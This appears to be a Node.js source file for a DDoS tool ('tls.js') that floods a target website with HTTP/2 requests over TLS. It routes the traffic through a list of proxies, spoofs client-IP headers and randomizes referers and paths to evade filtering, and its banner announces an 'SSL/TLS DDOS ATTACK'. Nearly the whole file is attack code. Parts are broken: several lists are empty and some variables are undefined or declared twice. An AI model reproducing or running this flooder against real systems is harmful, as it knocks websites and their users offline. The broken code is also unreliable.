const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 var path = require("path");
 const crypto = require("crypto");
 const UserAgent = require('user-agents');
 const fs = require("fs");
 const axios = require('axios');
 const https = require('https');

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
 });

 if (process.argv.length < 7){
 console.log(`node tls.js <target> <times> <RPS> <thread> <proxyfile>`); process.exit();}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }

 const getCurrentTime = () => {
    const now = new Date();
    const hours = now.getHours().toString().padStart(2, '0');
    const minutes = now.getMinutes().toString().padStart(2, '0');
    const seconds = now.getSeconds().toString().padStart(2, '0');
    return `(\x1b[34m${hours}:${minutes}:${seconds}\x1b[0m)`;
  };

  const targetURL = process.argv[2];
  const agent = new https.Agent({ rejectUnauthorized: false });

  function getStatus() {
  const timeoutPromise = new Promise((resolve, reject) => {
    setTimeout(() => {
      reject(new Error('Request timed out'));
    }, 5000);
  });

  const axiosPromise = axios.get(targetURL, { httpsAgent: agent });

  Promise.race([axiosPromise, timeoutPromise])
    .then((response) => {
      const { status, data } = response;
      console.log(`[\x1b[34mlucu\x1b[0m] ${getCurrentTime()} TITLE ON GOOGLE: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
    })
    .catch((error) => {
      if (error.message === 'Request timed out') {
        console.log(`[\x1b[34mlucu\x1b[0m] ${getCurrentTime()} Request Timed Out`);
      } else if (error.response) {
        const extractedTitle = getTitleFromHTML(error.response.data);
        console.log(`[\x1b[34mlucu\x1b[0m] ${getCurrentTime()} TITLE ON GOOGLE: ${extractedTitle} (\x1b[31m${error.response.status}\x1b[0m)`);
      } else {
        console.log(`[\x1b[34mlucu\x1b[0m] ${getCurrentTime()} ${error.message}`);
      }
    });
}


 function getTitleFromHTML(html) {
   const titleRegex = /<title>(.*?)<\/title>/i;
   const match = html.match(titleRegex);
   if (match && match[1]) {
     return match[1];
   }
   return 'Not Found';
 }

 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }

 function getRandomNumberBetween(min,max){
     return Math.floor(Math.random()*(max-min+1)+min);
 }

 function randomString(length) {
   var result = "";
   var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   var charactersLength = characters.length;
   for (var i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   ;
   return result;
 }

 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
} 

 
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6]
}


if (cluster.isMaster){
  console.clear();
  console.log('\x1b[36m%s\x1b[0m', 'DDOS STREESED');
  console.log('\x1b[36m%s\x1b[0m', 'STRESED SERVER\n');
  console.log('\x1b[36m%s\x1b[0m', 'SSL/TLS DDOS ATTACK!!!');
  
  for (let i = 1; i <= process.argv[5]; i++){
    cluster.fork();
    console.log(`[\x1b[32mCODE\x1b[0m] ${getCurrentTime()} DDOS ATTACK ${i} Started`);
  }
  console.log(`[\x1b[34mSERVER\x1b[0m] ${getCurrentTime()} DDOS ATTACK START`);
  setInterval(getStatus, 2000);
  setTimeout(() => {
    console.log(`[\x1b[34mSERVER\x1b[0m] ${getCurrentTime()} DDOS ATTACK DONE`);
    process.exit(1);
  }, process.argv[3] * 1000);
} 

const cplist = [
 
];

const hihi = [ "require-corp", "unsafe-none", ];

const sigalgs = [
 
];

lang_header = [
  
]

accept_header = [
  
],

encoding_header = [],

controle_header = [],

encoding_header = []

controle_header = []

const Methods = [
];
const randomMethod = Methods[Math.floor(Math.random() * Methods.length)];

const queryStrings = [
  "&", 
  "=", 
];

const pathts = [
  "/",
  "?page=1",
  "?page=2",
  "?page=3",
  "?category=news",
  "?category=sports",
  "?category=technology",
  "?category=entertainment", 
  "?sort=newest",
  "?filter=popular",
  "?limit=10",
  "?start_date=1989-06-04",
  "?end_date=1989-06-04",
];
const refers = [
  "https://www.google.com/search?q=",
  "https://check-host.net/",
  "https://www.facebook.com/",
  "https://www.youtube.com/",
  "https://www.fbi.com/",
  "https://www.bing.com/search?q=",
  "https://r.search.yahoo.com/",
  "https://www.cia.gov/index.html",
  "https://vk.com/profile.php?redirect=",
  "https://www.usatoday.com/search/results?q=",
  "https://help.baidu.com/searchResult?keywords=",
  "https://steamcommunity.com/market/search?q=",
  "https://www.ted.com/search?q=",
  "https://play.google.com/store/search?q=",
  "https://www.qwant.com/search?q=",
  "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
  "https://www.google.ad/search?q=",
  "https://www.google.ae/search?q=",
  "https://www.google.com.af/search?q=",
  "https://www.google.com.ag/search?q=",
  "https://www.google.com.ai/search?q=",
  "https://www.google.al/search?q=",
  "https://www.google.am/search?q=",
  "https://www.google.co.ao/search?q=",
  "http://anonymouse.org/cgi-bin/anon-www.cgi/",
  "http://coccoc.com/search#query=",
  "http://ddosvn.somee.com/f5.php?v=",
  "http://engadget.search.aol.com/search?q=",
  "http://engadget.search.aol.com/search?q=query?=query=&q=",
  "http://eu.battle.net/wow/en/search?q=",
  "http://filehippo.com/search?q=",
  "http://funnymama.com/search?q=",
  "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=",
  "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/",
  "http://go.mail.ru/search?mail.ru=1&q=",
  "http://help.baidu.com/searchResult?keywords=",
  "http://host-tracker.com/check_page/?furl=",
  "http://itch.io/search?q=",
  "http://jigsaw.w3.org/css-validator/validator?uri=",
  "http://jobs.bloomberg.com/search?q=",
  "http://jobs.leidos.com/search?q=",
  "http://jobs.rbs.com/jobs/search?q=",
  "http://king-hrdevil.rhcloud.com/f5ddos3.html?v=",
  "http://louis-ddosvn.rhcloud.com/f5.html?v=",
  "http://millercenter.org/search?q=",
  "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=",
  "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/",
  "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=",
  "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/",
  "http://page-xirusteam.rhcloud.com/f5ddos3.html?v=",
  "http://php-hrdevil.rhcloud.com/f5ddos3.html?v=",
  "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x&q=",
  "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x/",
  "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf&q=",
  "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf/",
  "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=",
  "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/",
  "http://search.aol.com/aol/search?q=",
  "http://taginfo.openstreetmap.org/search?q=",
  "http://techtv.mit.edu/search?q=",
  "http://validator.w3.org/feed/check.cgi?url=",
  "http://vk.com/profile.php?redirect=",
  "http://www.ask.com/web?q=",
  "http://www.baoxaydung.com.vn/news/vn/search&q=",
  "http://www.bestbuytheater.com/events/search?q=",
  "http://www.bing.com/search?q=",
  "http://www.evidence.nhs.uk/search?q=",
  "http://www.google.com/?q=",
  "http://www.google.com/translate?u=",
  "http://www.google.ru/url?sa=t&rct=?j&q=&e&q=",
  "http://www.google.ru/url?sa=t&rct=?j&q=&e/",
  "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
  "http://www.pagescoring.com/website-speed-test/?url=",
  "http://www.reddit.com/search?q=",
  "http://www.search.com/search?q=",
  "http://www.shodanhq.com/search?q=",
  "http://www.ted.com/search?q=",
  "http://www.topsiteminecraft.com/site/pinterest.com/search?q=",
  "http://www.usatoday.com/search/results?q=",
  "http://www.ustream.tv/search?q=",
  "http://yandex.ru/yandsearch?text=",
  "http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=",
  "http://ytmnd.com/search?q=",
  "https://add.my.yahoo.com/rss?url=",
  "https://careers.carolinashealthcare.org/search?q=",
  "https://check-host.net/",
  "https://developers.google.com/speed/pagespeed/insights/?url=",
  "https://drive.google.com/viewerng/viewer?url=",
  "https://duckduckgo.com/?q=",
  "https://google.com/",
  "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=&q=",
  "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882&q=",
  "https://help.baidu.com/searchResult?keywords=",
  "https://play.google.com/store/search?q=",
  "https://pornhub.com/",
  "https://r.search.yahoo.com/",
  "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
  "https://steamcommunity.com/market/search?q=",
  "https://vk.com/profile.php?redirect=",
  "https://www.bing.com/search?q=",
  "https://www.cia.gov/index.html",
  "https://www.facebook.com/",
  "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
  "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
  "https://www.fbi.com/",
  "https://www.google.ad/search?q=",
  "https://www.google.ae/search?q=",
  "https://www.google.al/search?q=",
  "https://www.google.co.ao/search?q=",
  "https://www.google.com.af/search?q=",
  "https://www.google.com.ag/search?q=",
  "https://www.google.com.ai/search?q=",
  "https://www.google.com/search?q=",
  "https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=",
  "https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=",
  "https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=",
  "https://www.npmjs.com/search?q=",
  "https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=",
  "https://www.pinterest.com/search/?q=",
  "https://www.qwant.com/search?q=",
  "https://www.ted.com/search?q=",
  "https://www.usatoday.com/search/results?q=",
  "https://www.yandex.com/yandsearch?text=",
  "https://www.youtube.com/",
  "https://yandex.ru/",
    'http://anonymouse.org/cgi-bin/anon-www.cgi/',
    'http://coccoc.com/search#query=',
    'http://ddosvn.somee.com/f5.php?v=',
    'http://engadget.search.aol.com/search?q=',
    'http://engadget.search.aol.com/search?q=query?=query=&q=',
    'http://eu.battle.net/wow/en/search?q=',
    'http://filehippo.com/search?q=',
    'http://funnymama.com/search?q=',
    'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=',
    'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/',
    'http://go.mail.ru/search?mail.ru=1&q=',
    'http://help.baidu.com/searchResult?keywords=',
    'http://host-tracker.com/check_page/?furl=',
    'http://itch.io/search?q=',
    'http://jigsaw.w3.org/css-validator/validator?uri=',
    'http://jobs.bloomberg.com/search?q=',
    'http://jobs.leidos.com/search?q=',
    'http://jobs.rbs.com/jobs/search?q=',
    'http://king-hrdevil.rhcloud.com/f5ddos3.html?v=',
    'http://louis-ddosvn.rhcloud.com/f5.html?v=',
    'http://millercenter.org/search?q=',
    'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=',
    'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/',
    'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=',
    'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/',
    'http://page-xirusteam.rhcloud.com/f5ddos3.html?v=',
    'http://php-hrdevil.rhcloud.com/f5ddos3.html?v=',
    'http://ru.search.yahoo.com/search?_query?=l%t=?=?A7x&q=',
    'http://ru.search.yahoo.com/search?_query?=l%t=?=?A7x/',
    'http://ru.search.yahoo.com/search_yzt=?=A7x9Q.bs67zf&q=',
    'http://ru.search.yahoo.com/search_yzt=?=A7x9Q.bs67zf/',
    'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=',
    'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/',
    'http://search.aol.com/aol/search?q=',
    'http://taginfo.openstreetmap.org/search?q=',
    'http://techtv.mit.edu/search?q=',
    'http://validator.w3.org/feed/check.cgi?url=',
    'http://vk.com/profile.php?redirect=',
    'http://www.ask.com/web?q=',
    'http://www.baoxaydung.com.vn/news/vn/search&q=',
    'http://www.bestbuytheater.com/events/search?q=',
    'http://www.bing.com/search?q=',
    'http://www.evidence.nhs.uk/search?q=',
    'http://www.google.com/?q=',
    'http://www.google.com/translate?u=',
    'http://www.google.ru/url?sa=t&rct=?j&q=&e&q=',
    'http://www.google.ru/url?sa=t&rct=?j&q=&e/',
    'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
    'http://www.pagescoring.com/website-speed-test/?url=',
    'http://www.reddit.com/search?q=',
    'http://www.search.com/search?q=',
    'http://www.shodanhq.com/search?q=',
    'http://www.ted.com/search?q=',
    'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
    'http://www.usatoday.com/search/results?q=',
    'http://www.ustream.tv/search?q=',
    'http://yandex.ru/yandsearch?text=',
    'http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=',
    'http://ytmnd.com/search?q=',
    'https://add.my.yahoo.com/rss?url=',
    'https://careers.carolinashealthcare.org/search?q=',
    'https://check-host.net/',
    'https://developers.google.com/speed/pagespeed/insights/?url=',
    'https://drive.google.com/viewerng/viewer?url=',
    'https://duckduckgo.com/?q=',
    'https://google.com/',
    'https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=&q=',
    'https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882&q=',
    'https://help.baidu.com/searchResult?keywords=',
    'https://play.google.com/store/search?q=',
    'https://pornhub.com/',
    'https://r.search.yahoo.com/',
    'https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=',
    'https://steamcommunity.com/market/search?q=',
    'https://vk.com/profile.php?redirect=',
    'https://www.bing.com/search?q=',
    'https://www.cia.gov/index.html',
    'https://www.facebook.com/',
    'https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=',
    'https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=',
    'https://www.fbi.com/',
    'https://www.google.ad/search?q=',
    'https://www.google.ae/search?q=',
    'https://www.google.al/search?q=',
    'https://www.google.co.ao/search?q=',
    'https://www.google.com.af/search?q=',
    'https://www.google.com.ag/search?q=',
    'https://www.google.com.ai/search?q=',
    'https://www.google.com/search?q=',
    'https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=',
    'https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=',
    'https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=',
    'https://www.npmjs.com/search?q=',
    'https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=',
    'https://www.pinterest.com/search/?q=',
    'https://www.qwant.com/search?q=',
    'https://www.ted.com/search?q=',
    'https://www.usatoday.com/search/results?q=',
    'https://www.yandex.com/yandsearch?text=',
    'https://www.youtube.com/',
    'https://yandex.ru/',
    'https://www.betvictor106.com/?jskey=BBOR1oulRNQaihu%2BdyW7xFyxxf0sxIMH%2BB%2FKe4qvs6S3u89h1BcavwQ%3D',

  ];
var randomReferer = refers[Math.floor(Math.random() * refers.length)];
let concu = sigalgs.join(':');
var randomReferer = refers[Math.floor(Math.random() * refers.length)];
let concu = sigalgs.join(':');

const uap = [
];


const ip_spoof = () => {
   const ip_segment = () => {
     return Math.floor(Math.random() * 255);
   };
   return `${""}${ip_segment()}${"."}${ip_segment()}${"."}${ip_segment()}${"."}${ip_segment()}${""}`;
 };
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 var proxies = readLines(args.proxyFile);
 const fakeIP = ip_spoof();
 var queryString = queryStrings[Math.floor(Math.random() * queryStrings.length)];
 const parsedTarget = url.parse(args.target);

 if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {setInterval(runFlooder) }
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port
     });
 
     connection.setTimeout(options.timeout * 10000);
     connection.setKeepAlive(true, 100000);
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
}

 const Socker = new NetSocket();
headers[":method"] = randomMethod;
headers[":path"] = parsedTarget.path + pathts[Math.floor(Math.random() * pathts.length)] + "&" + randomString(10) + queryString + randomString(10);
headers["origin"] = parsedTarget.host;
headers["Content-Type"] = randomHeaders['Content-Type'];
headers[":scheme"] = "https";
headers["x-download-options"] = randomHeaders['x-download-options'];
headers["Cross-Origin-Embedder-Policy"] = randomHeaders['Cross-Origin-Embedder-Policy'];
headers["Cross-Origin-Opener-Policy"] = randomHeaders['Cross-Origin-Opener-Policy'];
headers["accept"] = randomHeaders['accept'];
headers["accept-language"] = randomHeaders['accept-language'];
headers["Referrer-Policy"] = randomHeaders['Referrer-Policy'];
headers["x-cache"] = randomHeaders['x-cache'];
headers["Content-Security-Policy"] = randomHeaders['Content-Security-Policy'];
headers["accept-encoding"] = randomHeaders['accept-encoding'];
headers["cache-control"] = "no-cache";
headers["DNT"] = "1";
headers["x-frame-options"] = randomHeaders['x-frame-options'];
headers["x-xss-protection"] = randomHeaders['x-xss-protection'];
headers["x-content-type-options"] = "nosniff";
headers["TE"] = "trailers";
headers["pragma"] = "no-cache";
headers["connection"] = "keep-alive";
headers["sec-ch-ua-platform"] = randomHeaders['sec-ch-ua-platform'];
headers["upgrade-insecure-requests"] = "1";
headers["sec-fetch-dest"] = randomHeaders['sec-fetch-dest'];
headers["sec-fetch-mode"] = randomHeaders['sec-fetch-mode'];
headers["sec-fetch-site"] = randomHeaders['sec-fetch-site'];
headers["X-Forwarded-Proto"] = HTTPS;
headers["sec-ch-ua"] = randomHeaders['sec-ch-ua'];
headers["sec-ch-ua-mobile"] = randomHeaders['sec-ch-ua-mobile'];
headers["sec-ch-ua-platform"] = randomHeaders['sec-ch-ua-platform'];
headers["vary"] = randomHeaders['vary'];
headers["x-requested-with"] = "XMLHttpRequest";
headers["TE"] = trailers;
headers["set-cookie"] = randomHeaders['set-cookie'];
headers["Server"] = randomHeaders['Server'];
headers["strict-transport-security"] = randomHeaders['strict-transport-security'];
headers["access-control-allow-headers"] = randomHeaders['access-control-allow-headers'];
headers["access-control-allow-origin"] = randomHeaders['access-control-allow-origin'];
headers["Content-Encoding"] = randomHeaders['Content-Encoding'];
headers["alt-svc"] = randomHeaders['alt-svc'];
headers["Via"] = fakeIP;
headers["sss"] = fakeIP;
headers["Sec-Websocket-Key"] = fakeIP;
headers["Sec-Websocket-Version"] = 13;
headers["Upgrade"] = websocket;
headers["X-Forwarded-For"] = fakeIP;
headers["X-Forwarded-Host"] = fakeIP;
headers["Client-IP"] = fakeIP;
headers["Real-IP"] = fakeIP;
headers["Referer"] = randomReferer;
headers["Upgrade-Insecure-Requests"] = "1";

 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
     const userAgentv2 = new UserAgent();
     var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
     headers[":authority"] = parsedTarget.host
     headers["user-agent"] = uap1;
 
     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 25
     };

    setTimeout(function(){
      process.exit(1);
    }, process.argv[3] * 1000);
    
    process.on('uncaughtException', function(er) {
    });
    process.on('unhandledRejection', function(er) {
    });

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 900000);

         const tlsOptions = {
            ALPNProtocols: ['http/1.1', 'h2'],
            challengesToSolve: Infinity,
            maxRetries: Infinity,
            retryDelay: 0,
            timeout: 0,
            maxConnections: Infinity,
            keepAlive: true,
            resolveWithFullResponse: true,
            followAllRedirects: true,
            maxRedirects: 10,
            clientTimeout: 5000,
            clientlareMaxTimeout: 10000,
            cloudflareTimeout: 5000,
            cloudflareMaxTimeout: 30000,
            ciphers: tls.getCiphers().join(":") + cipper,
            secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method",],
            servername: url.hostname,
            socket: connection,
            honorCipherOrder: true,
            secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
            sigals: concu,
            echdCurve: "GREASE:X25519:x25519:P-256:P-384:P-521:X448",
            secure: true,
            Compression: false,
            rejectUnauthorized: false,
            port: 443,
            uri: parsedTarget.host,
            servername: parsedTarget.host,
            sessionTimeout: 5000,
        };

         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.setKeepAlive(true, 60 * 10000);
 
         const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          },
             maxSessionMemory: 64000,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn,
             socket: connection,
         });
 
         client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 20000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          });
 
         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(headers)
                    
                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });
    
                    request.end();
                }
            }, 1000); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
 
         client.on("error", error => {
             client.destroy();
             connection.destroy();
             return
         });
     });
}
